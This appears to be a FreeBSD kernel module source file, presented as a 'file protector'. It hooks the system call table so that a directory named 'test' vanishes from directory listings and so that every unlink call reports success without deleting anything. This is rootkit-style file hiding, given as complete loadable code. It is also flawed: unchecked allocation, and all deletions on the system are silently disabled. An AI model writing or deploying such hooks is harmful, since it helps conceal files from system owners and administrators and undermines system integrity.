/*
 * Name:
 *      File Protector Hook
 * Description:
 *      A system call module that protects files
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-15
 * Last Update:
 *      2013-02-24
 *
*/
/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>

/* Directory Headers */
#include <sys/dirent.h>

/* Options */
#define KERNDEBUG 1
#define HIDDENDIR "test"

/* file_protector implementing function */
static int file_protector(struct thread *td, void *syscall_args)
{
    uprintf("Welcome!\n");
    return (0);
}

/* unlink hook - prevent file/directory removal */
static int unlink_hook(struct thread *td, void *syscall_args)
{
    struct unlink_args /* {
            const char *path //path to the file/directory to be removed
            }*/*args;
    args = (struct unlink_args *)syscall_args;
    return (0);

}

/* getdirentries hook - hide file/directory */
static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
                int fd, //[man]file descriptor
                char *buf, //[man]buffer space, results will be returned to here
                int nbytes, //[man]Up to nbytes of data will be transferred
                            //[man]Must be greater or equal to the filesystem block size
                long *basep
            }*/*args;
    args = (struct getdirentries_args *)syscall_args;

    /* Intialize dirent structs in kernel space */
    struct dirent /* {
                u_int32_t d_fileno, //[man]Unique number for each distinct file
                u_int16_t d_reclen, //[man]The length of the directory record, in bytes
                                    //[man]Can be used as an offset to the next entry
                u_int8_t d_type, //[man]The type of the file pointed to by the directory record
                u_int8_t d_namelen, //[man]Length of the filename excluding null byte.
                char d_name[MAXNAMELEN + 1] //[man]Null terminated file name
                }*/*dirptr, *currptr;
    unsigned int tbytes, count, reclen;
    int flag = 0;

    /* call the original getdirentries */
    sys_getdirentries(td, syscall_args);
    tbytes = td->td_retval[0]; //[bsdkern]Actual transferred bytes returned by the system call

    /* Don't bother to do anything if the directory is empty */
    if(tbytes > 0) {
        /* Allocate memory for dirent structs in kernel space */
        MALLOC(dirptr, struct dirent *, tbytes, M_TEMP, M_NOWAIT);

        /* Copy buf to dirptr in kernel space */
        copyin(args->buf, dirptr, tbytes);

        currptr = dirptr;
        count = tbytes;

        /* Iterate through the directory entries */
        while (count > 0) {
            reclen = currptr->d_reclen;
            count -= reclen;

            /* Check if the entry name matches the hide config */
            if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
                /* If the currptr is pointing to the last entry, no need to remove */
                if (count != 0) {
                    /* Copy the rest of entries to the address of current node, overwrite the hidden file */
                    bcopy((char *)currptr + reclen, currptr, count);
                    flag = 1;
                }
                /* Modify transferred bytes */
                tbytes -= reclen;
            }

            /* The last directory entry always has a d_reclen of 0. Check to avoid infinite loop */
            if (currptr->d_reclen == 0) {
                /* Break the loop */
                count = 0;
            }

            /* Check if there's anymore to loop */
            if (count != 0 && flag == 0) {
                /* Point the currptr to the next entry using d_reclen */
                currptr = (struct dirent *)((char *)currptr + reclen);
            }
            flag = 0;
        }

        /* Adjust the transferred bytes return value to reflect any changes made */
        td->td_retval[0] = tbytes;
        /* Then copy the manipulated result back to user space buffer */
        copyout(dirptr, args->buf, tbytes);

        /* Free kernel variables */
        FREE(dirptr, M_TEMP);
    }

    return(0);
}

/* Prepare sysent to register the new system call */
static struct sysent getdirentries_hook_sysent = {
    1,  /* Number of arguments */
    file_protector /* implementing function */
};

/* Define the offset in sysent[] where the new system call is to be allocated */
static int offset = NO_SYSCALL; /* Default, using the next available slots offset in sysent table */

/* Event handler function for the new system call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("Hooking getdirentries, unlink....\n");
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
            sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("Unhooking getdirentries, unlink....\n");
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
            break;
        default:
            error = EOPNOTSUPP; /* Operation not supported */
            break;
    }

    return(error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(file_protector, &offset, &getdirentries_hook_sysent, load, NULL);
